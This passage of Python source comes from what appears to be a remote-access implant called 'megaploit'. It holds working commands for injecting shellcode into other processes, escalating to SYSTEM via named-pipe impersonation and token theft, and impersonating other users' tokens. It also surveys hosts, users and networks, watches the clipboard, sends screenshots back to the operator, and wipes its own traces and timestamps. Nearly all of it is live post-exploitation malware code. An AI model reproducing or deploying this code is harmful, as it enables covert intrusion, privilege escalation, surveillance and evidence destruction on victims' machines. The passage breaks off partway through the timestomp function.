            ["kdialog", "--title", title, "--msgbox", message],
            ["xmessage", "-title", title, message],
        ):
            if shutil.which(cmd_args[0]):
                subprocess.Popen(cmd_args,
                                 stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
                return f"[+] Message box shown via {cmd_args[0]}"
        return "[-] No GUI dialog tool found (install zenity / kdialog / xmessage)"


# ---------------------------------------------------------------------------
# Shellcode injection (Windows only)
# ---------------------------------------------------------------------------

@_register("inject_shellcode")
def _inject_shellcode(conn, args: list[str]) -> str:
    """
    Inject raw shellcode (hex-encoded) into a running process and execute it
    via a remote thread. Requires Windows and sufficient privileges.
    Usage: inject_shellcode <pid> <hex_shellcode>
    Example: inject_shellcode 1234 fc4883e4f0...
    """
    if sys.platform != "win32":
        return "[-] inject_shellcode is Windows-only"
    if len(args) != 2 or not args[0].isdigit():
        return "Usage: inject_shellcode <pid> <hex_shellcode>"
    pid = int(args[0])
    try:
        shellcode = bytes.fromhex(args[1])
    except ValueError:
        return "[-] Invalid hex shellcode"
    try:
        import ctypes
        from ctypes import wintypes

        MEM_COMMIT             = 0x1000
        MEM_RESERVE            = 0x2000
        PAGE_EXECUTE_READWRITE = 0x40
        PROCESS_ALL_ACCESS     = 0x1F0FFF

        kernel32 = ctypes.windll.kernel32

        h_process = kernel32.OpenProcess(PROCESS_ALL_ACCESS, False, pid)
        if not h_process:
            return f"[-] OpenProcess({pid}) failed — error {kernel32.GetLastError()}"

        alloc = kernel32.VirtualAllocEx(
            h_process, None, len(shellcode),
            MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE
        )
        if not alloc:
            kernel32.CloseHandle(h_process)
            return "[-] VirtualAllocEx failed"

        written = ctypes.c_size_t(0)
        kernel32.WriteProcessMemory(
            h_process, alloc,
            shellcode, len(shellcode),
            ctypes.byref(written)
        )

        thread_id = wintypes.DWORD(0)
        h_thread  = kernel32.CreateRemoteThread(
            h_process, None, 0, alloc, None, 0, ctypes.byref(thread_id)
        )
        if not h_thread:
            kernel32.CloseHandle(h_process)
            return "[-] CreateRemoteThread failed"

        kernel32.CloseHandle(h_thread)
        kernel32.CloseHandle(h_process)
        return f"[+] Shellcode injected into PID {pid} — TID {thread_id.value}"
    except Exception as e:
        return f"[-] inject_shellcode: {e}"


# ---------------------------------------------------------------------------
# Self-destruct
# ---------------------------------------------------------------------------

@_register("self_destruct")
def _self_destruct(conn, args: list[str]) -> str:
    """
    Wipe the agent binary, any registry persistence key, keylog file, and
    then terminate this process.  No confirmation — run only when you mean it.
    """
    messages: list[str] = []

    # 1. Remove Windows registry key if it was set
    if sys.platform == "win32":
        try:
            subprocess.call(
                "reg delete HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run "
                "/f 2>nul",
                shell=True
            )
            messages.append("[+] Registry run key removed")
        except Exception as e:
            messages.append(f"[-] Registry cleanup: {e}")

    # 2. Delete keylog file
    from megaploit.core.config import KEYLOG_PATH
    try:
        if os.path.isfile(KEYLOG_PATH):
            os.remove(KEYLOG_PATH)
            messages.append("[+] Keylog file removed")
    except OSError as e:
        messages.append(f"[-] Keylog removal: {e}")

    # 3. Overwrite and delete the agent script
    agent_path = os.path.abspath(sys.argv[0]) if sys.argv else None
    if agent_path and os.path.isfile(agent_path):
        try:
            size = os.path.getsize(agent_path)
            with open(agent_path, "wb") as f:
                f.write(os.urandom(size))   # overwrite with random bytes
            os.remove(agent_path)
            messages.append(f"[+] Agent binary wiped: {agent_path}")
        except OSError as e:
            messages.append(f"[-] Agent wipe: {e}")

    messages.append("[*] Self-destruct complete — terminating.")

    # Schedule exit in a separate thread so the response can be sent first
    def _exit():
        time.sleep(1)
        os._exit(0)

    threading.Thread(target=_exit, daemon=True).start()
    return "\n".join(messages)


# ---------------------------------------------------------------------------
# Process & network intelligence
# ---------------------------------------------------------------------------

@_register("ps")
def _ps(conn, args: list[str]) -> str:
    """List running processes. Optional name/pid filter."""
    filt = args[0].lower() if args else ""
    try:
        import psutil
        lines = [f"  {'PID':<8} {'NAME':<30} {'USER':<16} {'CPU%':<7} MEM%"]
        lines.append("  " + "─" * 72)
        for p in sorted(psutil.process_iter(["pid","name","username","cpu_percent","memory_percent"]),
                         key=lambda x: x.info["pid"] or 0):
            try:
                i = p.info
                n = (i.get("name") or "").lower()
                pid_s = str(i.get("pid",""))
                if filt and filt not in n and filt not in pid_s:
                    continue
                lines.append(f"  {pid_s:<8} {(i.get('name') or ''):<30} "
                              f"{(i.get('username') or '')[:16]:<16} "
                              f"{i.get('cpu_percent',0.0):<7.1f} "
                              f"{i.get('memory_percent',0.0):.1f}")
            except (psutil.NoSuchProcess, psutil.AccessDenied):
                pass
        return "\n".join(lines)
    except ImportError:
        # fallback to shell
        if sys.platform == "win32":
            return _shell_exec("tasklist /FO TABLE /NH")
        return _shell_exec("ps aux")


@_register("kill")
def _kill(conn, args: list[str]) -> str:
    if not args or not args[0].isdigit():
        return "Usage: kill <pid>"
    pid = int(args[0])
    try:
        import psutil
        p = psutil.Process(pid)
        p.terminate()
        return f"[+] Sent SIGTERM to PID {pid} ({p.name()})"
    except ImportError:
        import signal
        os.kill(pid, signal.SIGTERM if hasattr(signal, "SIGTERM") else 9)
        return f"[+] Killed PID {pid}"
    except Exception as e:
        return f"[-] kill: {e}"


@_register("netstat")
def _netstat(conn, args: list[str]) -> str:
    try:
        import psutil
        lines = [f"  {'PROTO':<7} {'LOCAL':<24} {'REMOTE':<24} {'STATE':<14} PID"]
        lines.append("  " + "─" * 76)
        for c in psutil.net_connections(kind="inet"):
            la = f"{c.laddr.ip}:{c.laddr.port}" if c.laddr else ""
            ra = f"{c.raddr.ip}:{c.raddr.port}" if c.raddr else ""
            proto = "tcp" if c.type == 1 else "udp"
            pid   = str(c.pid or "")
            lines.append(f"  {proto:<7} {la:<24} {ra:<24} {(c.status or ''):<14} {pid}")
        return "\n".join(lines)
    except ImportError:
        if sys.platform == "win32":
            return _shell_exec("netstat -ano")
        return _shell_exec("ss -tunp")


@_register("arp")
def _arp(conn, args: list[str]) -> str:
    if sys.platform == "win32":
        return _shell_exec("arp -a")
    return _shell_exec("arp -n 2>/dev/null || ip neigh show")


@_register("dns_query")
def _dns_query(conn, args: list[str]) -> str:
    if not args:
        return "Usage: dns_query <hostname>"
    import socket as _sock
    host = args[0]
    try:
        infos = _sock.getaddrinfo(host, None)
        addrs = list({r[4][0] for r in infos})
        return "\n".join(f"  {host}  →  {a}" for a in addrs)
    except Exception as e:
        return f"[-] DNS lookup failed: {e}"


@_register("routes")
def _routes(conn, args: list[str]) -> str:
    if sys.platform == "win32":
        return _shell_exec("route print")
    return _shell_exec("ip route 2>/dev/null || netstat -rn")


@_register("ifconfig")
def _ifconfig(conn, args: list[str]) -> str:
    try:
        import psutil
        lines = []
        for iface, addrs in psutil.net_if_addrs().items():
            lines.append(f"  {iface}:")
            for a in addrs:
                af = {2:"IPv4", 10:"IPv6", 17:"MAC"}.get(a.family, str(a.family))
                lines.append(f"    {af:<6} {a.address}")
        return "\n".join(lines) if lines else "(no interfaces)"
    except ImportError:
        if sys.platform == "win32":
            return _shell_exec("ipconfig /all")
        return _shell_exec("ip addr 2>/dev/null || ifconfig")


# ---------------------------------------------------------------------------
# Environment & system discovery
# ---------------------------------------------------------------------------

@_register("env")
def _env(conn, args: list[str]) -> str:
    filt = args[0].lower() if args else ""
    pairs = []
    for k, v in sorted(os.environ.items()):
        if not filt or filt in k.lower() or filt in v.lower():
            pairs.append(f"  {k}={v}")
    return "\n".join(pairs) if pairs else "(no matching env vars)"


@_register("installed_software")
def _installed_software(conn, args: list[str]) -> str:
    if sys.platform == "win32":
        return _shell_exec(
            "reg query HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Uninstall "
            "/s /v DisplayName 2>nul | findstr DisplayName"
        )
    elif sys.platform == "darwin":
        return _shell_exec("system_profiler SPApplicationsDataType | grep '    Location:'")
    else:
        for cmd in ("dpkg --get-selections", "rpm -qa", "pacman -Q", "flatpak list"):
            bin_ = cmd.split()[0]
            if shutil.which(bin_):
                return _shell_exec(cmd)
        return "[-] No package manager found"


@_register("active_windows")
def _active_windows(conn, args: list[str]) -> str:
    if sys.platform == "win32":
        try:
            import ctypes
            import ctypes.wintypes as wt
            EnumWindows     = ctypes.windll.user32.EnumWindows
            GetWindowTextW  = ctypes.windll.user32.GetWindowTextW
            IsWindowVisible = ctypes.windll.user32.IsWindowVisible
            titles: list[str] = []
            WNDENUMPROC = ctypes.WINFUNCTYPE(ctypes.c_bool, ctypes.c_int, ctypes.c_int)
            def _cb(hwnd, _):
                if IsWindowVisible(hwnd):
                    buf = ctypes.create_unicode_buffer(256)
                    GetWindowTextW(hwnd, buf, 256)
                    t = buf.value.strip()
                    if t:
                        titles.append(t)
                return True
            EnumWindows(WNDENUMPROC(_cb), 0)
            return "\n".join(f"  {t}" for t in titles)
        except Exception as e:
            return f"[-] active_windows: {e}"
    elif sys.platform == "darwin":
        return _shell_exec(
            "osascript -e 'tell application \"System Events\" "
            "to get the title of every window of every process'"
        )
    else:
        if shutil.which("wmctrl"):
            return _shell_exec("wmctrl -l")
        return "[-] wmctrl not found (install wmctrl for Linux window listing)"


@_register("scheduled_tasks")
def _scheduled_tasks(conn, args: list[str]) -> str:
    if sys.platform == "win32":
        return _shell_exec("schtasks /query /fo LIST /v 2>&1 | findstr /i \"Task Name\\|Status\\|Run As\"")
    elif sys.platform == "darwin":
        return _shell_exec("launchctl list")
    else:
        out = []
        for f in ("/var/spool/cron/crontabs", "/etc/cron.d", "/etc/crontab"):
            if os.path.exists(f):
                out.append(f"=== {f} ===")
                try:
                    if os.path.isdir(f):
                        for fn in sorted(os.listdir(f)):
                            fp = os.path.join(f, fn)
                            try:
                                with open(fp) as fh:
                                    out.append(fh.read())
                            except PermissionError:
                                out.append(f"  [{fn}] permission denied")
                    else:
                        with open(f) as fh:
                            out.append(fh.read())
                except PermissionError:
                    out.append("  permission denied")
        return "\n".join(out) if out else "[-] No cron entries found"


@_register("services")
def _services(conn, args: list[str]) -> str:
    filt = args[0].lower() if args else ""
    if sys.platform == "win32":
        raw = _shell_exec("sc query type= all state= all 2>&1")
        if filt:
            raw = "\n".join(l for l in raw.splitlines() if filt in l.lower())
        return raw
    else:
        cmd = "systemctl list-units --type=service --no-pager 2>/dev/null"
        if filt:
            cmd += f" | grep -i {filt}"
        return _shell_exec(cmd) or _shell_exec("service --status-all 2>&1")


@_register("users")
def _users(conn, args: list[str]) -> str:
    if sys.platform == "win32":
        return _shell_exec("net user 2>&1")
    try:
        import pwd
        lines = [f"  {'USER':<20} {'UID':<6} {'GID':<6} {'HOME':<30} SHELL"]
        for p in sorted(pwd.getpwall(), key=lambda x: x.pw_uid):
            lines.append(f"  {p.pw_name:<20} {p.pw_uid:<6} {p.pw_gid:<6} {p.pw_dir:<30} {p.pw_shell}")
        return "\n".join(lines)
    except ImportError:
        return _shell_exec("cat /etc/passwd")


@_register("logged_in")
def _logged_in(conn, args: list[str]) -> str:
    if sys.platform == "win32":
        return _shell_exec("query user 2>&1")
    return _shell_exec("w -h 2>/dev/null || who")


@_register("startup_items")
def _startup_items(conn, args: list[str]) -> str:
    if sys.platform == "win32":
        return _shell_exec(
            "reg query HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run 2>&1 && "
            "reg query HKCU\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run 2>&1"
        )
    elif sys.platform == "darwin":
        return _shell_exec("launchctl list | head -50")
    else:
        paths = [
            "/etc/rc.local",
            "/etc/init.d",
            os.path.expanduser("~/.config/autostart"),
            "/etc/xdg/autostart",
        ]
        out = []
        for p in paths:
            if os.path.exists(p):
                out.append(f"=== {p} ===")
                if os.path.isdir(p):
                    out.extend(f"  {f}" for f in os.listdir(p))
                else:
                    try:
                        with open(p) as fh:
                            out.append(fh.read()[:500])
                    except PermissionError:
                        out.append("  (permission denied)")
        return "\n".join(out) if out else "(none found)"


@_register("os_info")
def _os_info(conn, args: list[str]) -> str:
    import platform
    lines = [
        f"  OS:           {platform.system()} {platform.release()} {platform.version()}",
        f"  Machine:      {platform.machine()}",
        f"  Node:         {platform.node()}",
        f"  Processor:    {platform.processor()}",
        f"  Python:       {platform.python_version()}",
    ]
    if sys.platform == "win32":
        lines.append("  --- Windows specifics ---")
        lines.append(_shell_exec("systeminfo 2>&1 | findstr /i \"OS Name\\|Version\\|Build\\|Install\\|Uptime\""))
    elif sys.platform == "linux":
        try:
            with open("/etc/os-release") as fh:
                lines.append("  --- /etc/os-release ---")
                lines.append(fh.read().strip())
        except OSError:
            pass
        lines.append(_shell_exec("uptime -p 2>/dev/null || uptime"))
    return "\n".join(lines)


# ---------------------------------------------------------------------------
# File intelligence
# ---------------------------------------------------------------------------

@_register("ls")
def _ls(conn, args: list[str]) -> str:
    import stat as _stat
    path = args[0] if args else os.getcwd()
    try:
        entries = sorted(os.listdir(path))
    except PermissionError:
        return f"[-] Permission denied: {path}"
    except FileNotFoundError:
        return f"[-] Not found: {path}"
    lines = [f"  {'NAME':<36} {'SIZE':>10}  {'PERMS':<12} MODIFIED"]
    for name in entries:
        full = os.path.join(path, name)
        try:
            st   = os.stat(full)
            size = st.st_size
            perm = oct(st.st_mode)[-4:]
            mtime = time.strftime("%Y-%m-%d %H:%M", time.localtime(st.st_mtime))
            suffix = "/" if os.path.isdir(full) else ""
            lines.append(f"  {name+suffix:<36} {size:>10,}  {perm:<12} {mtime}")
        except OSError:
            lines.append(f"  {name}")
    return "\n".join(lines)


@_register("cat")
def _cat(conn, args: list[str]) -> str:
    if not args:
        return "Usage: cat <file>"
    path = args[0]
    if not os.path.isfile(path):
        return f"[-] Not found: {path}"
    try:
        size = os.path.getsize(path)
        if size > 1_048_576:
            return f"[-] File too large to cat ({size:,} bytes). Use download instead."
        with open(path, "r", encoding="utf-8", errors="replace") as fh:
            return fh.read()
    except PermissionError:
        return f"[-] Permission denied: {path}"
    except Exception as e:
        return f"[-] cat: {e}"


@_register("find_files")
def _find_files(conn, args: list[str]) -> str:
    if len(args) < 2:
        return "Usage: find_files <path> <pattern>"
    import fnmatch
    root, pat = args[0], args[1]
    hits: list[str] = []
    for dirpath, dirs, files in os.walk(root):
        for fn in files:
            if fnmatch.fnmatch(fn.lower(), pat.lower()):
                hits.append(os.path.join(dirpath, fn))
            if len(hits) >= 500:
                break
        if len(hits) >= 500:
            break
    return "\n".join(hits) if hits else f"[-] No files matching '{pat}' under {root}"


@_register("find_writable")
def _find_writable(conn, args: list[str]) -> str:
    if not args:
        return "Usage: find_writable <path>"
    root = args[0]
    hits: list[str] = []
    for dirpath, dirs, files in os.walk(root):
        for name in dirs + files:
            full = os.path.join(dirpath, name)
            try:
                if os.access(full, os.W_OK):
                    hits.append(full)
            except OSError:
                pass
        if len(hits) >= 200:
            break
    return "\n".join(hits) if hits else "[-] No world-writable paths found"


@_register("find_suid")
def _find_suid(conn, args: list[str]) -> str:
    if sys.platform == "win32":
        return "[-] SUID is a Unix concept"
    return _shell_exec(
        "find / -perm /6000 -type f -not -path '/proc/*' -not -path '/sys/*' 2>/dev/null | head -100"
    )


@_register("file_hash")
def _file_hash(conn, args: list[str]) -> str:
    if not args:
        return "Usage: file_hash <path>"
    import hashlib
    path = args[0]
    if not os.path.isfile(path):
        return f"[-] Not found: {path}"
    try:
        h = hashlib.sha256()
        with open(path, "rb") as fh:
            for chunk in iter(lambda: fh.read(65536), b""):
                h.update(chunk)
        return f"[+] SHA-256  {path}\n    {h.hexdigest()}"
    except Exception as e:
        return f"[-] file_hash: {e}"


@_register("tail")
def _tail(conn, args: list[str]) -> str:
    if not args:
        return "Usage: tail <file> [lines]"
    path  = args[0]
    n     = int(args[1]) if len(args) > 1 and args[1].isdigit() else 20
    if not os.path.isfile(path):
        return f"[-] Not found: {path}"
    try:
        with open(path, "r", encoding="utf-8", errors="replace") as fh:
            all_lines = fh.readlines()
        return "".join(all_lines[-n:])
    except Exception as e:
        return f"[-] tail: {e}"


@_register("write_file")
def _write_file(conn, args: list[str]) -> str:
    if len(args) < 2:
        return "Usage: write_file <path> <content>"
    path    = args[0]
    content = " ".join(args[1:])
    try:
        os.makedirs(os.path.dirname(path) or ".", exist_ok=True)
        with open(path, "w", encoding="utf-8") as fh:
            fh.write(content)
        return f"[+] Written: {path}"
    except Exception as e:
        return f"[-] write_file: {e}"


@_register("mkdir")
def _mkdir(conn, args: list[str]) -> str:
    if not args:
        return "Usage: mkdir <path>"
    try:
        os.makedirs(args[0], exist_ok=True)
        return f"[+] Created: {args[0]}"
    except Exception as e:
        return f"[-] mkdir: {e}"


@_register("rm")
def _rm(conn, args: list[str]) -> str:
    if not args:
        return "Usage: rm <path>"
    path = args[0]
    try:
        if os.path.isdir(path):
            import shutil as _shutil
            _shutil.rmtree(path)
        else:
            os.remove(path)
        return f"[+] Removed: {path}"
    except Exception as e:
        return f"[-] rm: {e}"


@_register("chmod")
def _chmod(conn, args: list[str]) -> str:
    if len(args) < 2:
        return "Usage: chmod <mode> <path>"
    if sys.platform == "win32":
        return "[-] chmod is Unix-only"
    try:
        os.chmod(args[1], int(args[0], 8))
        return f"[+] chmod {args[0]} {args[1]}"
    except Exception as e:
        return f"[-] chmod: {e}"


# ---------------------------------------------------------------------------
# GUI & interaction
# ---------------------------------------------------------------------------

@_register("screenshot_region")
def _screenshot_region(conn, args: list[str]) -> str | None:
    if len(args) != 4 or not all(a.isdigit() for a in args):
        return "Usage: screenshot_region <x> <y> <width> <height>"
    x, y, w, h = int(args[0]), int(args[1]), int(args[2]), int(args[3])
    try:
        import io, cv2, mss, numpy as np
        with mss.mss() as sct:
            region = {"top": y, "left": x, "width": w, "height": h}
            raw = sct.grab(region)
            arr = np.array(raw)
        bgr = cv2.cvtColor(arr, cv2.COLOR_BGRA2BGR)
        ok, buf = cv2.imencode(".jpg", bgr, [cv2.IMWRITE_JPEG_QUALITY, 85])
        if not ok:
            return "[-] encode failed"
        fname = "_region.jpg"
        with open(fname, "wb") as f:
            f.write(buf.tobytes())
        with _send_lock:
            _send_msg(conn, "FILE_OK")
            _send_file(conn, fname)
        try:
            os.remove(fname)
        except OSError:
            pass
        return None
    except Exception as e:
        return f"[-] screenshot_region: {e}"


@_register("notify")
def _notify(conn, args: list[str]) -> str:
    if len(args) < 2:
        return "Usage: notify <title> <message>"
    title = args[0]
    msg   = " ".join(args[1:])
    if sys.platform == "win32":
        # Windows toast via PowerShell
        ps = (f"[Windows.UI.Notifications.ToastNotificationManager, Windows.UI.Notifications, "
              f"ContentType=WindowsRuntime] | Out-Null; "
              f"$xml = [Windows.UI.Notifications.ToastNotificationManager]"
              f"::GetTemplateContent([Windows.UI.Notifications.ToastTemplateType]::ToastText02); "
              f"$xml.GetElementsByTagName('text')[0].InnerText = '{title}'; "
              f"$xml.GetElementsByTagName('text')[1].InnerText = '{msg}'; "
              f"$toast = [Windows.UI.Notifications.ToastNotification]::new($xml); "
              f"[Windows.UI.Notifications.ToastNotificationManager]::CreateToastNotifier('Megaploit')"
              f".Show($toast)")
        try:
            subprocess.Popen(["powershell", "-NoProfile", "-NonInteractive", "-Command", ps],
                             stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
            return "[+] Notification sent"
        except Exception as e:
            return f"[-] notify: {e}"
    elif sys.platform == "darwin":
        script = f'display notification "{msg}" with title "{title}"'
        subprocess.Popen(["osascript", "-e", script],
                         stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
        return "[+] Notification sent"
    else:
        for cmd in (["notify-send", title, msg], ["zenity", "--notification", f"--text={title}: {msg}"]):
            if shutil.which(cmd[0]):
                subprocess.Popen(cmd, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
                return f"[+] Notification sent via {cmd[0]}"
        return "[-] No notification tool available (install libnotify / notify-send)"


@_register("open_url")
def _open_url(conn, args: list[str]) -> str:
    if not args:
        return "Usage: open_url <url>"
    import webbrowser
    try:
        webbrowser.open(args[0])
        return f"[+] Opened: {args[0]}"
    except Exception as e:
        return f"[-] open_url: {e}"


@_register("play_sound")
def _play_sound(conn, args: list[str]) -> str:
    if not args:
        return "Usage: play_sound <wav_path>"
    path = args[0]
    if not os.path.isfile(path):
        return f"[-] Not found: {path}"
    if sys.platform == "win32":
        try:
            import ctypes
            ctypes.windll.winmm.PlaySoundW(path, None, 0x0001)
            return "[+] Sound played"
        except Exception as e:
            return f"[-] play_sound: {e}"
    elif sys.platform == "darwin":
        subprocess.Popen(["afplay", path], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
        return "[+] Sound played"
    else:
        for cmd in (["aplay", path], ["paplay", path], ["ffplay", "-nodisp", "-autoexit", path]):
            if shutil.which(cmd[0]):
                subprocess.Popen(cmd, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
                return f"[+] Sound played via {cmd[0]}"
        return "[-] No audio player found"


@_register("set_wallpaper")
def _set_wallpaper(conn, args: list[str]) -> str:
    if not args:
        return "Usage: set_wallpaper <image_path>"
    path = os.path.abspath(args[0])
    if not os.path.isfile(path):
        return f"[-] Not found: {path}"
    if sys.platform == "win32":
        try:
            import ctypes
            ctypes.windll.user32.SystemParametersInfoW(20, 0, path, 3)
            return "[+] Wallpaper changed"
        except Exception as e:
            return f"[-] set_wallpaper: {e}"
    elif sys.platform == "darwin":
        script = f'tell app "Finder" to set desktop picture to POSIX file "{path}"'
        subprocess.Popen(["osascript", "-e", script],
                         stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
        return "[+] Wallpaper changed"
    else:
        for cmd in (
            ["gsettings", "set", "org.gnome.desktop.background", "picture-uri", f"file://{path}"],
            ["feh", "--bg-scale", path],
            ["xfconf-query", "-c", "xfce4-desktop", "-p",
             "/backdrop/screen0/monitor0/workspace0/last-image", "-s", path],
        ):
            if shutil.which(cmd[0]):
                subprocess.Popen(cmd, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
                return f"[+] Wallpaper changed via {cmd[0]}"
        return "[-] No wallpaper tool found"


@_register("clip_watch")
def _clip_watch(conn, args: list[str]) -> str:
    if not args or not args[0].isdigit():
        return "Usage: clip_watch <seconds>"
    seconds = int(args[0])
    seen: set[str] = set()
    lines: list[str] = []
    end = time.time() + seconds

    def _read():
        try:
            if sys.platform == "win32":
                out = subprocess.check_output(
                    ["powershell","-NoProfile","-NonInteractive","-command","Get-Clipboard"],
                    text=True, stderr=subprocess.DEVNULL)
                return out.strip()
            elif sys.platform == "darwin":
                return subprocess.check_output(["pbpaste"], text=True).strip()
            else:
                for cmd in (["xclip","-selection","clipboard","-o"],
                            ["xsel","--clipboard","--output"],["wl-paste"]):
                    if shutil.which(cmd[0]):
                        return subprocess.check_output(cmd, text=True,
                                                       stderr=subprocess.DEVNULL).strip()
        except Exception:
            pass
        return ""

    while time.time() < end:
        val = _read()
        if val and val not in seen:
            seen.add(val)
            ts = time.strftime("%H:%M:%S")
            lines.append(f"[{ts}] {val[:200]}")
        time.sleep(2)

    return "\n".join(lines) if lines else "(no clipboard changes detected)"


# ---------------------------------------------------------------------------
# Token & privilege
# ---------------------------------------------------------------------------

@_register("whoami_priv")
def _whoami_priv(conn, args: list[str]) -> str:
    if sys.platform == "win32":
        return _shell_exec("whoami /priv /groups 2>&1")
    return _shell_exec("id && sudo -l 2>/dev/null")


@_register("make_token")
def _make_token(conn, args: list[str]) -> str:
    if sys.platform != "win32":
        return "[-] make_token is Windows-only"
    if len(args) < 3:
        return "Usage: make_token <username> <domain> <password>"
    user, domain, password = args[0], args[1], args[2]
    try:
        import ctypes
        import ctypes.wintypes as wt
        LOGON32_LOGON_NEW_CREDENTIALS  = 9
        LOGON32_PROVIDER_WINNT50       = 3
        h_token = wt.HANDLE()
        ok = ctypes.windll.advapi32.LogonUserW(
            user, domain, password,
            LOGON32_LOGON_NEW_CREDENTIALS, LOGON32_PROVIDER_WINNT50,
            ctypes.byref(h_token)
        )
        if not ok:
            err = ctypes.windll.kernel32.GetLastError()
            return f"[-] LogonUser failed — error {err}"
        ok2 = ctypes.windll.advapi32.ImpersonateLoggedOnUser(h_token)
        ctypes.windll.kernel32.CloseHandle(h_token)
        if not ok2:
            return "[-] ImpersonateLoggedOnUser failed"
        return f"[+] Token created and impersonating {domain}\\{user}"
    except Exception as e:
        return f"[-] make_token: {e}"


@_register("rev2self")
def _rev2self(conn, args: list[str]) -> str:
    if sys.platform != "win32":
        return "[-] rev2self is Windows-only"
    try:
        import ctypes
        ctypes.windll.advapi32.RevertToSelf()
        return "[+] Reverted to original token"
    except Exception as e:
        return f"[-] rev2self: {e}"


@_register("getsystem")
def _getsystem(conn, args: list[str]) -> str:
    """
    Attempt automated local privilege escalation using multiple techniques.

    Windows (tried in order):
      1. Named-pipe impersonation  — create a named pipe and lure a SYSTEM
         service to connect, then impersonate its token
         (primary Metasploit getsystem technique)
      2. Token steal / SeDebugPrivilege  — duplicate a SYSTEM process token
      3. Unquoted service-path hijack discovery

    Linux:
      1. sudo -l  — check for passwordless sudo rules
      2. SUID binary sweep
    """
    # Windows pre-flight (only on Windows — on Linux we continue and check sudo)
    if sys.platform == "win32":
        priv_err = _windows_privcheck()
        if priv_err:
            return priv_err + "\n[*] getsystem will attempt techniques anyway…"

    if sys.platform != "win32":
        # Linux: passwordless sudo check
        for candidate in ("sudo -l", "pkexec --version"):
            result = _shell_exec(candidate + " 2>/dev/null")
            if "[sudo]" not in result and "not allowed" not in result:
                return f"[*] Potential vector: {candidate}\n{result}"
        return "[*] Checking SUID binaries…\n" + _shell_exec(
            "find / -perm -4000 -type f 2>/dev/null | head -20"
        )

    # ── Technique 1: Named-pipe impersonation ─────────────────────────────
    pipe_result = _getsystem_named_pipe()
    if "[+]" in pipe_result:
        return pipe_result

    # ── Technique 2: Token steal (SeDebugPrivilege) ───────────────────────
    token_result = _token_steal(conn, [])
    if "[+]" in token_result:
        return token_result

    # ── Technique 3: Unquoted service path discovery ──────────────────────
    hijack = _shell_exec(
        'wmic service get name,pathname,startmode 2>&1 | '
        'findstr /i "auto" | findstr /v "\\"'
    )
    if hijack.strip():
        return f"[*] Potential unquoted service path(s):\n{hijack}"

    return (
        "[-] getsystem: all 3 techniques failed\n"
        f"  pipe: {pipe_result.strip()}\n"
        f"  token: {token_result.strip()}"
    )


def _getsystem_named_pipe() -> str:
    """
    Technique 1 — Named-pipe impersonation.

    Creates a named pipe, spawns a SYSTEM-context trigger (sc.exe start or
    a scheduler task that calls back), waits for a connection, then calls
    ImpersonateNamedPipeClient.  This is the classic Metasploit getsystem
    technique (originally from Meterpreter's metsrv).

    Requires Windows, local admin rights (to create a service or schtask).
    """
    if sys.platform != "win32":
        return "[-] named-pipe impersonation is Windows-only"
    try:
        import ctypes
        import ctypes.wintypes as wt
        import threading as _thr
        import uuid as _uuid

        kernel32  = ctypes.windll.kernel32
        advapi32  = ctypes.windll.advapi32

        # ── Create the named pipe ─────────────────────────────────────
        pipe_name = r"\\.\pipe\megaploit_" + _uuid.uuid4().hex[:8]
        PIPE_ACCESS_DUPLEX     = 0x00000003
        PIPE_TYPE_BYTE         = 0x00000000
        PIPE_READMODE_BYTE     = 0x00000000
        PIPE_WAIT              = 0x00000000
        NMPWAIT_USE_DEFAULT_WAIT = 0xFFFFFFFF
        INVALID_HANDLE_VALUE   = wt.HANDLE(-1).value
        FILE_FLAG_OVERLAPPED   = 0x40000000

        h_pipe = kernel32.CreateNamedPipeW(
            pipe_name,
            PIPE_ACCESS_DUPLEX,
            PIPE_TYPE_BYTE | PIPE_READMODE_BYTE | PIPE_WAIT,
            1, 512, 512, NMPWAIT_USE_DEFAULT_WAIT, None,
        )
        if h_pipe == INVALID_HANDLE_VALUE:
            return "[-] named-pipe: CreateNamedPipeW failed"

        connected = [False]
        error     = [None]

        def _wait_for_client():
            # Wait up to 8 s for a SYSTEM client to connect
            connected[0] = bool(kernel32.ConnectNamedPipe(h_pipe, None))

        t = _thr.Thread(target=_wait_for_client, daemon=True)
        t.start()

        # ── Lure a SYSTEM process to connect via sc/schtasks ─────────
        # Write a tiny VBScript that opens the pipe, triggerable by schtask
        import tempfile as _tmp, os as _os
        vbs = _tmp.NamedTemporaryFile(suffix=".vbs", delete=False, mode="w")
        vbs.write(
            f'Set f = CreateObject("Scripting.FileSystemObject")\n'
            f'f.OpenTextFile("{pipe_name}", 1)\n'
        )
        vbs_path = vbs.name
        vbs.close()

        # Schedule as SYSTEM via schtasks (requires local admin)
        task_name = "megaploit_gs_" + _uuid.uuid4().hex[:6]
        _shell_exec(
            f'schtasks /create /tn {task_name} /tr "cscript //nologo {vbs_path}" '
            f'/sc once /st 00:00 /ru SYSTEM /f 2>&1'
        )
        _shell_exec(f'schtasks /run /tn {task_name} 2>&1')

        t.join(timeout=8)

        # Cleanup task + vbs
        _shell_exec(f'schtasks /delete /tn {task_name} /f 2>&1')
        try:
            _os.unlink(vbs_path)
        except OSError:
            pass

        if not connected[0]:
            kernel32.CloseHandle(h_pipe)
            return "[-] named-pipe: no SYSTEM client connected within timeout"

        # ── Impersonate the connecting SYSTEM client ──────────────────
        if advapi32.ImpersonateNamedPipeClient(h_pipe):
            kernel32.CloseHandle(h_pipe)
            return "[+] getsystem: SYSTEM via named-pipe impersonation"

        kernel32.CloseHandle(h_pipe)
        return "[-] named-pipe: ImpersonateNamedPipeClient failed"

    except Exception as exc:
        return f"[-] named-pipe: {exc}"


# ---------------------------------------------------------------------------
# Evasion & anti-forensics
# ---------------------------------------------------------------------------

@_register("timestomp")
def _timestomp(conn, args: list[str]) -> str:
    if len(args) < 2:
        return "Usage: timestomp <target_path> <reference_path>"
    target, ref = args[0], args[1]
    if not os.path.exists(target):
        return f"[-] Target not found: {target}"
